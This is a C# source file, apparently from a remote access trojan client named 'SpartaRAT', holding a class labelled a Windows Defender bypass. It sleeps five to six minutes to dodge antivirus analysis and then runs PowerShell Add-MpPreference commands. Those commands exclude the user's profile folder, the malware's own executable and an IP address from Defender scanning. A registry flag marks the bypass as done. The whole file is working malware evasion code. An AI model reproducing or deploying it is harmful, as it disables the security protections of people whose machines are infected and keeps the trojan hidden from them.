using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Tools;
using System;
using System.Reflection;
using System.Threading;

namespace SpartaRATclient
{
    public class Exclusion
    {
        //Windows defender bypass
        public void Exclude()
        {
            //Long sleeps help bypassing AV
            Random _ = new Random();
            Thread.Sleep(_.Next(300_000, 350_000));

            RegistryCheck item = new RegistryCheck();
            if (!(item.CheckIfExist("DefenderBypassed")))
            {
                Shell PowershellCommand = new Shell();
                //Defender execlude bypass. "-AttackSurfaceReductionOnlyExclusions" is not risky as "-ExclusionPath" so it first to be runned
                PowershellCommand.Run("Add-MpPreference -AttackSurfaceReductionOnlyExclusions \"C:\\Users\\" + Environment.UserName +
                        " && Add-MpPreference -AttackSurfaceReductionOnlyExclusions " + Assembly.GetExecutingAssembly().Location + " && Add-MpPreference -ExclusionIpAddress " + "0.0.0.0");
                //Doing this to make 1000% sure that windows defender will not detect me
                //HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\
                PowershellCommand.Run("Add-MpPreference -ExclusionPath C:\\Users\\" + Environment.UserName);
                RegistryCreate value = new RegistryCreate();
                value.Create("DefenderBypassed", "0");
            }
        }
    }
}